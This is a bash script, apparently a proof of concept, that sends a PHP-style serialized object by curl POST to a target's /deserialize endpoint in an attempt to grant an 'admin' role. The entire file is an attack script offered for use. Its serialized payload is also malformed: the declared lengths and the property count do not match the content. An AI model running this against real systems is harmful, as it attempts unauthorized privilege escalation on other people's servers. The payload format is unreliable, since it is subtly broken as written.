#!/bin/bash

# Usage: ./insecure_deserialization_exploit.sh <target_url>
TARGET_URL=$1

if [ -z "$TARGET_URL" ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

echo "Exploiting insecure deserialization on $TARGET_URL..."

# Malicious serialized object (example)
MALICIOUS_OBJECT="O:4:\"User \":1:{s:4:\"name\";s:4:\"test\";s:4:\"role\";s:6:\"admin\";}"

# Send the payload
curl -s -X POST "$TARGET_URL/deserialize" -d "data=$MALICIOUS_OBJECT"

echo "Insecure deserialization exploit attempt completed."
